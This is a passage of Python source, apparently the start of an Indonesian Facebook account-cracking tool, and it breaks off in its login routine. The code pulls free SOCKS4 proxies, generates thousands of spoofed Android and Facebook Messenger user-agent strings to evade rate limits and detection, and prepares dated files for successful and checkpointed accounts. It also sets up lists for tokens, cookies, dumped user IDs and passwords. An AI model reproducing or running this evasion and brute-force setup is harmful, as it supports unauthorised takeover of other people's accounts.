# import module
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred

# imoort module rich
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from rich.table import Table as me
from rich.console import Console as sol
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from time import time as kontol
from rich.tree import Tree
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz

# user agent
pretty.install()
CON=sol()
ugen2=[]
ugen=[]
ugen4=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=80000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('connection error');exit()
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
	a='Dalvik/2.1.0 (Linux; U; Android 8.1.0;'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='CPH1909 Build/O11019)'
	e=random.randrange(100, 9999)
	f='[FBAN/Orca-Android;FBAV/241.0.0.17.116;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/182747440 ;FBCR/TRUE-H;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1909;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='{densitas=2.0,lebar=1424,tinggi=720};FB_FW /1;]"'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen.append(uaku)
xro=[]
for aku in range(5000):
  rr = random.randint
  vivi = f"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36"
  if aku in ugen:pass
  else:ugen.append(vivi)
kepang=[]
for K197 in range(10000):
            ver = random.choice(["7","8","9","10","12","13","14","6.0","7.0","8.0","9.0","7.1.1","8.0.0","8.1.0",f"{str(random.randint(5,9))}.0.0",f"{str(random.randint(5,9))}.0.1",f"{str(random.randint(5,9))}.1.1",f"{str(random.randint(5,9))}.1.{str(random.randint(0,1))}"])
            klot = random.choice(['SM-G920F','Moto G','Moto X','Motorola Moto X','Moto G14','Moto G Stylus','NRD90M','MatePad Pro 11','nova 11 SE ','Mate 60 Pro+ ','Huawei Mate 20 Pro','Huawei P30 Lite','NRD90M','SM-T535','LRX22G', 'SM-T231','KOT49H', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-N7100','KOT49H', 'SM-T561','KTU84P', 'GT-N7100','KOT49H', 'GT-I9500','LRX22C', 'SM-J320F','LMY47V', 'SM-G930F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X', 'GT-P5100','IML74K', 'SM-J320F','LMY47V', 'GT-N8000','JZO54K', 'SM-T531','LRX22G', 'SPH-L720','KOT49H', 'GT-I9500','JDQ39', 'SM-G935F','NRD90M', 'SM-T561','KTU84P', 'SM-T531','KOT49H', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'SM-A500FU','MMB29M', 'SM-A500F','MMB29M', 'SM-T311','KOT49H', 'SM-T531','LRX22G', 'SM-J320F','LMY47V', 'SM-J320FN','LMY47V', 'SM-J320F','LMY47V', 'GT-P5210','KOT49H', 'SM-T230','KOT49H', 'GT-I9192','KOT49H', 'SM-T235','KOT4', 'GT-N7100','KOT49H', 'SM-A500F','LRX22G', 'SM-A500F','MMB29M', 'GT-N7100','KOT49H', 'SM-G920F','MMB29K', 'SM-J510FN','NMF26X', 'GT-N8000','JZO54K', 'SM-J320FN','LMY47V', 'SM-J320FN','LMY47V', 'SM-A500H','MMB29M', 'GT-I9300','JSS15J', 'GT-I9500','LRX22C', 'SM-J320F','LMY4', 'SM-J510FN','NMF26X', 'SM-A500F','MMB29M', 'GT-N8000','KOT49H', 'SM-T561','KTU84P', 'SM-G900F','KOT49H', 'GT-S7390','JZO54K', 'SM-J320F','LMY47V', 'GT-P5100','JZO54K', 'SM-A500FU','MMB29M', 'SM-G930F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T561','KTU84P', 'GT-N8000','KOT49H', 'SM-T531','LRX22G', 'SM-J510FN','MMB29M', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5110','JDQ39', 'GT-I9301I','KOT49H', 'SM-A500F','LRX22G', 'SM-G930F','NRD90M', 'SM-T311','KOT4', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'SM-J320M','LMY47V', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'GT-I9192','KOT49H', 'SM-G935F','MMB29K', 'SM-J701F','NRD90M;', 'GT-I9301I','KOT4', 'SM-J320FN','LMY47V', 'SM-T111','JDQ39', 'SM-A500F','MMB29M', 'SM-J510FN','NMF2', 'SM-T705','LRX22G', 'SM-G920F','NRD90M', 'GT-N5100','JZO54K', 'GT-I9300I','KTU84P', 'GT-I9300I','KTU84P', 'GT-N8000','KOT49H', 'GT-N8000','KOT49H', 'SM-A500F','MMB29M', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5100','JDQ39', 'GT-I9300I','KTU84P', 'GT-N5100','JZO54K', 'GT-N8000','KOT49H', 'GT-I9500','LRX22C', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'GT-N8000','JZO54K', 'SM-T805','LRX22G', 'SM-T231','KOT49H', 'GT-N5100','JZO54K', 'SM-J320H','LMY47V', 'SM-T231','KOT49H', 'SM-G930F','NRD90M', 'SM-G935F','NRD90M', 'SM-T310','KOT49H', 'GT-N8000','KOT49H', 'GT-I9300I','KTU84P', 'SM-G920F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T705','LRX22G;', 'GT-P3110','JZO54K', 'GT-I9192','KOT49H', 'SM-J320F','LMY47V', 'SM-G920F','NRD90M', 'GT-I9300','IMM76D', 'SM-G950F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X;', 'SM-J701F','NRD90M', 'SM-A500F','LRX22G', 'SM-T231','KOT49H', 'SM-T311','KOT49H', 'SM-J320FN','LMY47V', 'GT-P5210','KOT49H', 'SM-T805','LRX22G', 'GT-I9500','LRX22C', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'GT-I9300','JSS15J', 'GT-N7100','KOT49H', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'SM-T315','JDQ39', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-P5220','JDQ39', 'SM-T525','KOT49H', 'SM-T555','LRX22G', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X;', 'SM-A500F','MMB29M', 'GT-I9192','KOT49H', 'GT-P5100','JDQ', 'SM-T311','KOT49H'])
            korban = random.choice(['Galaxy A7(2016)', 'a7xltechn', 'SM-A710XZ', 'Absolute', 'GT-B9120', 'GT-B9120', 'Acclaim', 'SCH-R880', 'SCH-R880', 'Admire', 'SCH-R720', 'SCH-R720', 'Amazing', 'amazingtrf', 'SGH-S730M', 'Baffin', 'baffinltelgt', 'SHV-E270L', 'Captivate Glide', 'SGH-I927 Samsung-SGH-I927', 'Captivate Glide', 'SGH-I927', 'SGH-I927', 'China Telecom', 'kylevectc', 'SCH-I699I', 'Chromebook Plus', 'kevin_cheets', 'kevin', 'Chromebook Plus', 'kevin_cheets Samsung Chromebook Plus', 'Chromebook Pro', 'caroline_cheets', 'caroline', 'Chromebook Pro', 'caroline_cheets Samsung Chromebook Pro', 'Conquer', 'SPH-D600', 'SPH-D600', 'DoubleTime', 'SGH-I857 Samsung-SGH-I857', 'Droid Charge', 'SCH-I510', 'SCH-I510', 'Elite', 'eliteltechn', 'SM-G1600', 'Elite', 'elitexltechn', 'SM-G1650', 'Europa', 'GT-I5500B', 'GT-I5500B', 'Europa', 'GT-I5500L', 'GT-I5500L', 'Europa', 'GT-I5500M', 'GT-I5500M', 'Europa', 'GT-I5503T', 'GT-I5503T', 'Europa', 'GT-I5510L', 'GT-I5510L', 'Exhibit', 'SGH-T759', 'SGH-T759', 'Galaxy (China)', 'GT-B9062', 'GT-B9062', 'Galaxy 070', 'hendrix', 'YP-GI2', 'Galaxy A', 'archer', 'archer', 'Galaxy A', 'archer', 'SHW-M100S', 'Galaxy A3 (2017)', 'a3y17lte', 'SM-A320Y', 'Galaxy A3', 'a33g', 'SM-A300H', 'Galaxy A3', 'a3lte', 'SM-A300F', 'Galaxy A3', 'a3lte', 'SM-A300M', 'Galaxy A3', 'a3lte', 'SM-A300XZ', 'Galaxy A3', 'a3lte', 'SM-A300YZ', 'Galaxy A3', 'a3ltechn', 'SM-A3000', 'Galaxy A3', 'a3ltechn', 'SM-A300X', 'Galaxy A3', 'a3ltectc', 'SM-A3009', 'Galaxy A3', 'a3ltedd', 'SM-A300G', 'Galaxy A3', 'a3lteslk', 'SM-A300F', 'Galaxy A3', 'a3ltezh', 'SM-A3000', 'Galaxy A3', 'a3ltezt', 'SM-A300YZ', 'Galaxy A3', 'a3ulte', 'SM-A300FU', 'Galaxy A3', 'a3ulte', 'SM-A300XU', 'Galaxy A3', 'a3ulte', 'SM-A300Y', 'Galaxy A3(2016)', 'a3xelte', 'SM-A310F', 'Galaxy A3(2016)', 'a3xelte', 'SM-A310M', 'Galaxy A3(2016)', 'a3xelte', 'SM-A310X', 'Galaxy A3(2016)', 'a3xelte', 'SM-A310Y', 'Galaxy A3(2016)', 'a3xeltekx', 'SM-A310N0', 'Galaxy A3(2017)', 'a3y17lte', 'SM-A320F', 'Galaxy A3(2017)', 'a3y17lte', 'SM-A320FL', 'Galaxy A3(2017)', 'a3y17lte', 'SM-A320X', 'Galaxy A5', 'a53g', 'SM-A500H', 'Galaxy A5', 'a5lte', 'SM-A500F', 'Galaxy A5', 'a5lte', 'SM-A500G', 'Galaxy A5', 'a5lte', 'SM-A500M', 'Galaxy A5', 'a5lte', 'SM-A500XZ', 'Galaxy A5', 'a5ltechn', 'SM-A5000', 'Galaxy A5', 'a5ltechn', 'SM-A500X', 'Galaxy A5', 'a5ltectc', 'SM-A5009', 'Galaxy A5', 'a5ltezh', 'SM-A5000', 'Galaxy A5', 'a5ltezt', 'SM-A500YZ', 'Galaxy A5', 'a5ulte', 'SM-A500FU', 'Galaxy A5', 'a5ulte', 'SM-A500Y', 'Galaxy A5', 'a5ultebmc', 'SM-A500W', 'Galaxy A5', 'a5ultektt', 'SM-A500K', 'Galaxy A5', 'a5ultelgt', 'SM-A500L', 'Galaxy A5', 'a5ulteskt', 'SM-A500F1', 'Galaxy A5', 'a5ulteskt', 'SM-A500S', 'Galaxy A5(2016)', 'a5xelte', 'SM-A510F', 'Galaxy A5(2016)', 'a5xelte', 'SM-A510M', 'Galaxy A5(2016)', 'a5xelte', 'SM-A510X', 'Galaxy A5(2016)', 'a5xelte', 'SM-A510Y', 'Galaxy A5(2016)', 'a5xeltecmcc', 'SM-A5108', 'Galaxy A5(2016)', 'a5xeltektt', 'SM-A510K', 'Galaxy A5(2016)', 'a5xeltelgt', 'SM-A510L', 'Galaxy A5(2016)', 'a5xelteskt', 'SM-A510S', 'Galaxy A5(2016)', 'a5xeltextc', 'SM-A510Y', 'Galaxy A5(2016)', 'a5xltechn', 'SM-A5100', 'Galaxy A5(2016)', 'a5xltechn', 'SM-A5100X', 'Galaxy A5(2016)', 'a5xltechn', 'SM-A510XZ', 'Galaxy A5(2017)', 'a5y17lte', 'SM-A520F', 'Galaxy A5(2017)', 'a5y17lte', 'SM-A520X', 'Galaxy A5(2017)', 'a5y17ltecan', 'SM-A520W', 'Galaxy A5(2017)', 'a5y17ltektt', 'SM-A520K', 'Galaxy A5(2017)', 'a5y17ltelgt', 'SM-A520L', 'Galaxy A5(2017)', 'a5y17lteskt', 'SM-A520S', 'Galaxy A5x(2016)', 'a5xeltextc', 'SM-A510Y', 'Galaxy A7', 'a73g', 'SM-A700H', 'Galaxy A7', 'a7alte', 'SM-A700F', 'Galaxy A7', 'a7lte', 'SM-A700FD', 'Galaxy A7', 'a7lte', 'SM-A700X', 'Galaxy A7', 'a7ltechn', 'SM-A7000', 'Galaxy A7', 'a7ltechn', 'SM-A700YD', 'Galaxy A7', 'a7ltectc', 'SM-A7009', 'Galaxy A7', 'a7ltektt', 'SM-A700K', 'Galaxy A7', 'a7ltelgt', 'SM-A700L', 'Galaxy A7', 'a7lteskt', 'SM-A700S', 'Galaxy A7(2016)', 'a7xelte', 'SM-A710F', 'Galaxy A7(2016)', 'a7xelte', 'SM-A710M', 'Galaxy A7(2016)', 'a7xelte', 'SM-A710X', 'Galaxy A7(2016)', 'a7xeltecmcc', 'SM-A7108', 'Galaxy A7(2016)', 'a7xeltektt', 'SM-A710K', 'Galaxy A7(2016)', 'a7xeltelgt', 'SM-A710L', 'Galaxy A7(2016)', 'a7xelteskt', 'SM-A710S', 'Galaxy A7(2016)', 'a7xeltextc', 'SM-A710Y', 'Galaxy A7(2016)', 'a7xltechn', 'SM-A7100', 'Galaxy A7(2017)', 'a7y17lte', 'SM-A720F', 'Galaxy A7(2017)', 'a7y17lteskt', 'SM-A720S', 'Galaxy A8', 'a8elte', 'SM-A800F', 'Galaxy A8', 'a8elte', 'SM-A800YZ', 'Galaxy A8', 'a8elteskt', 'SM-A800S', 'Galaxy A8', 'a8hplte', 'SM-A800I', 'Galaxy A8', 'a8hplte', 'SM-A800IZ', 'Galaxy A8', 'a8ltechn', 'SM-A8000', 'Galaxy A8', 'a8ltechn', 'SM-A800X', 'Galaxy A8', 'SCV32', 'SCV32', 'Galaxy A8(2016)', 'a8xelte', 'SM-A810F', 'Galaxy A8(2016)', 'a8xelte', 'SM-A810YZ', 'Galaxy A8(2016)', 'a8xelteskt', 'SM-A810S', 'Galaxy A9 Pro', 'a9xproltechn', 'SM-A9100', 'Galaxy A9 Pro', 'a9xproltesea', 'SM-A910F', 'Galaxy A9(2016)', 'a9xltechn', 'SM-A9000', 'Galaxy Ace 4 Lite', 'vivalto3g', 'SM-G313U'])
            has = random.choice(["en","gb","id","de","ru","sg","fr","ir","jp","br","cz","hk","cn","vn","ph","in","tr","es","it","tw"])
            vere = random.choice(["7","8","9","10","12"])
            fp = random.randrange(99, 121)
            fw = random.randrange(4010, 6016)
            fm = random.randrange(110, 160)
            kps = random.choice([f"v2.21.2.1","v2.21.1.2","v2.21.1.1","v2.9.6.1","v2.9.5.1","v2.9.4.2","v2.9.3.4","v2.9.3.3","v2.9.3.2","v2.9.2.1"])
            sup= f"Mozilla/5.0 (Linux; Android {ver}; {korban}; Windows {vere} Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/{str(random.randint(60,121))}.0.{str(random.randint(5500,6100))}.{str(random.randint(100,160))} Mobile Safari/537.36"
            supi = f"Mozilla/5.0 (Linux; Android {ver}; {klot}; {has}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{fp}.0.{fw}.{fm} HiBrowser/{kps} UWS/ Mobile Safari/537.36"
            segel = random.choice([sup,supi])
            kepang.append(segel)  
for A1 in range(5000):
            ver = random.choice(["7","8","9","10","12","13","14","6.0","7.0","8.0","9.0","7.1.1","8.0.0","8.1.0",f"{str(random.randint(5,9))}.0.0",f"{str(random.randint(5,9))}.0.1",f"{str(random.randint(5,9))}.1.1",f"{str(random.randint(5,9))}.1.{str(random.randint(0,1))}"])
            vere = random.choice(["7","8","9","10","12","13","14"])
            hu1 = random.choice(['LYO-L21','LYO-L01','CAM-L21','SCC-U21','SCL-U31','SCL-L21','SCL-L01','SCL-L04','SCL-AL00','HW-SCL-L32','SCL-TL00','SCL-L03','SCL-TL00H','OXF-AN00','PCT-L29','BKL-L04S','JMM-AL10','DUK-AL20','KNT-UL10','ALA-AN70','PCT-AL10','BKL-L09S','JMM-TL10','JDN2-AL00HN','MOA-AL20','JAT-AL00','DUA-AL00','TFY-AN40','CMA-AN40','VNE-AN40','CHL-AL00','NEW-AN90','HJC-AN90','AKA-AL10','CHM-TL00','WDY-AN00','RKY-AN00','ELN-L09','KOZ-AL00','HJC-LX9','AGM-W09HN','Kobe2-L09','Kobe2-L03','KOB2-L09','KOB2-W09','KOB2-AL00HN','AGR-W09HN','BRT-W09','BRT-AN09','JDN-AL00'])
            hu2 = random.choice(['RMO-NX1 Build/HONORRMO-N21','ANY-NX1 Build/HONORANY-N01','ANY-NX1 Build/HONORANY-N21','ANY-LX3 Build/HONORANY-L23CQ','ANY-LX3 Build/HONORANY-L03CQ','ANY-LX3 Build/HONORANY-L22CQ','CRT-LX2 Build/HONORCRT-L32','CRT-LX2 Build/HONORCRT-L33','CRT-LX2 Build/HONORCRT-L31','CRT-LX3 Build/HONORCRT-L03','VNE-N41 Build/HONORVNE-N41','TFY-LX1 Build/HONORTFY-L31CQ','TFY-LX1 Build/HONORTFY-L32CQ','TFY-LX1 Build/HONORTFY-L03CQ','RKY-LX1 Build/HONORRKY-L31','RKY-LX1 Build/HONORRKY-L32','RKY-LX1 Build/HONORRKY-L03','CMA-LX1 Build/HONORCMA-L41CQ','CMA-LX1 Build/HONORCMA-L42CQ','WDY-LX2 Build/HONORWDY-L32','WDY-LX2 Build/HONORWDY-L31','CRT-AN00 Build/HONORCRT-AN00','ALI-AN00 Build/HONORALI-AN00','WOD-LX1 Build/HONORWDY-L41','VNA-LX2 Build/HONORVNA-LX2','DIO-AN00 Build/HONORDIO-AN00','ADT-AN00 Build/HONORADT-AN00D','RMO-AN00 Build/HONORRMO-AN00','TFY-AN00 Build/HONORTFY-AN00','KKG-AN70 Build/HONORKKG-AN70','CHL-AN00 Build/HONORCHL-AN00','NTN-AN20 Build/HONORNTN-TN20','KKG-AN00 Build/HONORKKG-AN00','DNN-LX9 Build/HONORDNN-LX9','TEL-AN10 Build/HONORTEL-AN10','TEL-AN00a Build/HONORTEL-AN00a','OXF-AN10 Build/HUAWEIOXF-AN10','OXF-AN00 Build/HUAWEIOXF-AN00','YOK-AN10 Build/HONORYOR-AN00','HUAWEI Honor Pro 10 Build/HONORMP-R10','HUAWEI HONOR PRO Build/HONORPRA-LX1','WDY-AN00 Build/HONORWDY-AN60','RKY-AN00 Build/HONORRKY-TN00','HJC-LX9 Build/HONORHJC-L29','JDN-W09 Build/HuaweiMediaPad','FRI-NX9 Build/HONORFRI-N39','ALI-NX1 Build/HONORALI-N21'])
            has = random.choice(["en-us","en-gb","id-id","de-de","ru-ru","en-sg","my-sg","fr-fr","fa-ir","ja-jp","pt-br","cs-cz","zh-hk","zh-cn","vi-vn","en-ph","en-in","tr-tr","es-es","it-it","zh-tw"])
            fp = random.randrange(99, 121)
            fw = random.randrange(4010, 6016)
            fm = random.randrange(110, 160)
            cup = random.randrange(11, 13)
            cip = random.randrange(1, 48)
            hp = random.randrange(11, 12)
            sp = random.randrange(15, 86)
            ns = random.choice(['10','13'])
            sule1 = f'Mozilla/5.0 (Linux; Android {ver}; {hu1} Build/HONOR{hu1}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{fp}.0.{fw}.{fm} Mobile Safari/537.36 com.yandex.zen/{str(random.randint(6,21))}.{str(random.randint(0,5))}.{str(random.randint(0,6))}.{str(random.randint(3560,10800))} (HUAWEI {hu1}; Android {ver}) ZenKit/{str(random.randint(2,21))}.{str(random.randint(0,9))}.{str(random.randint(0,6))}.{str(random.randint(0,1))}-internalNewdesign-Zen'
            sule2 = f'Mozilla/5.0 (Linux; Android {vere}; {hu2}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{fp}.0.{fw}.{fm} Mobile Safari/537.36 T7/{cup}.{cip} SP-engine/2.{sp}.0 matrixstyle/0 lite baiduboxapp/{cup}.{cip}.0.{hp} (Baidu; P1 {ns}) NABar/1.0'
            susu = random.choice([sule1,sule2])
            xro.append(susu)  
ugen4= []
for xr in range(10000):
    rr = random.randint
    rc = random.choice
    ugent1 = f"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(60,150))}.0.{str(rr(2500,6000))}.{str(rr(60,150))} Safari/537.36"
    ugent2 = f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(60,150))}.0.{str(rr(2500,6000))}.{str(rr(60,150))} Safari/537.36"
    ugent3 = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(60,150))}.0.{str(rr(2500,6000))}.{str(rr(60,150))} Safari/537.36"
    ugent4 = f"Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(60,150))}.0.{str(rr(2500,6000))}.{str(rr(60,150))} Safari/537.36"
    ugent5 = f"Mozilla/5.0 (Linux; Android {str(rr(6,13))}; SM-G570Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    ugent6 = f"Mozilla/5.0 (Linux; Android {str(rr(6,13))}; SM-J530Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    ugent7 = f"Mozilla/5.0 (Linux; Android {str(rr(6,13))}; SM-T116NU) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    ugent8 = f"Mozilla/5.0 (Linux; Android {str(rr(6,13))}; Lenovo A6020a40 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    ugent9 = f"Mozilla/5.0 (Linux; Android {str(rr(6,13))}; U PULSE) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    ugent10 = f"Mozilla/5.0 (Linux; Android {str(rr(6,13))}; HUAWEI LUA-U22 Build/HUAWEILUA-U22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36" 
    ugent11 = f"Mozilla/5.0 (Linux; Android {str(rr(6,13))}; Coolpad E570 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    ugent12 = f"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    xr = random.choice([ugent1,ugent2,ugent3,ugent4,ugent5,ugent6,ugent7,ugent8,ugent9,ugent10,ugent11,ugent12])
    ugen4.append(xr)
def uazku():
    rr = random.randint
    rc = random.choice
    uazku1 = f"Mozilla/5.0 (Linux; U; Android {str(rr(9,12))}; zh-tw; Mi 10 Ultra Build/RKQ1.{str(rr(111111,199999))}.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(71,99))}.0.{str(rr(3500,3900))}.{str(rr(140,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.12.1-gn"
    uazku2 = f"Mozilla/5.0 (Linux; Android {str(rr(9,12))}; en-in; Redmi Note 11R Build/SP1A.{str(rr(111111,199999))}.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(75,150))}.0.{str(rr(5500,5900))}.{str(rr(73,99))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.16.3.1-gn{str(rr(5300,5500))},4.3.0.{str(rr(5300,5500))}"
    uazku3 = f"Mozilla/5.0 (Linux; U; Android 11; ru-ru; Redmi K40 Pro+ Build/RKQ1.201112.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(75,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.12.1-gn"
    uazku4 = f"Mozilla/5.0 (Linux; Android {str(rr(9,12))}; en-us; Mi 10 Lite Zoom Build/SKQ1.211006.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(60,99))}.0.{str(rr(3400,3900))}.{str(rr(100,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/13.20.0-gn"
    uazku5 = f"Mozilla/5.0 (Linux; Android {str(rr(1,8))}.1.0; tr-tr; Redmi K60E Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(60,99))}.0.{str(rr(3400,3900))}.{str(rr(100,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.16.3.1-gn"
    uazku6 = f"Mozilla/5.0 (Linux; Android {str(rr(4,7))}.{str(rr(1,5))}; Redmi 5A Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(60,99))}.0.{str(rr(3400,3900))}.{str(rr(100,150))} Mobile Safari/537.36"
    uazku7 = f"Mozilla/5.0 (Linux; Android {str(rr(9,13))}; zh-tw; 23054RA19C Build/UP1A.231005.007) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(60,99))}.0.{str(rr(3400,3900))}.{str(rr(100,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/18.3.210611"
    uazku8 = str(rc([uazku1, uazku2, uazku3, uazku4, uazku5, uazku6, uazku7]))
    return uazku8    
for x in range(10):
	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()

# global nama
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni,dump= [],[],0,0,0,[],[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]

#  warna style 
D = '\33[m'           # WARNA DEFAULT
K = '\033[93m'    # WARNA KUNING 
H = '\x1b[1;92m' # WARNA HIJAU 
B = '\x1b[0;34m' # WARNA BIRU TUA
U = '\033[95m'    # WARNA UNGU
xr = random.choice([H,K,B,U])

# Save tanggal bulan dan tahun
dic = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
dic2 = {'01':'Januari','02':'Februari','03':'Maret','04':'April','05':'Mei','06':'Juni','07':'Juli','08':'Agustus','09':'September','10':'Oktober','11':'November','12':'Desember'}
tanggal = datetime.datetime.now().day
bulan = dic[(str(datetime.datetime.now().month))]
tahun = datetime.datetime.now().year
okc = 'OK-'+str(tanggal)+'-'+str(bulan)+'-'+str(tahun)+'.txt'
cpc = 'CP-'+str(tanggal)+'-'+str(bulan)+'-'+str(tahun)+'.txt'

# setting jalan
def jalan(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.001)
def clear():
	os.system('clear')
def back():
	login()

# waktu 
def sapa_waktu():
    jam = datetime.datetime.now().hour

    if 5 <= jam < 12:
        return "selamat pagi"
    elif 12 <= jam < 18:
        return "selamat siang"
    elif 18 <= jam < 24:
        return "selamat sore"
    else:
        return "selamat malam"

pesan_selamat = sapa_waktu()

# logo banner
def banner():
	clear()
	print(f'''{H}
\t       _   __ ___   ____ _  __ ___ 
\t      / \,' // o.) / __/| |/,'/ o |
\t     / \,' // o \ / _/  /  / /  ,' 
\t    /_/ /_//___,'/_/  ,'_n_\/_/`_\{D}''')

# bagian cek cookie
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
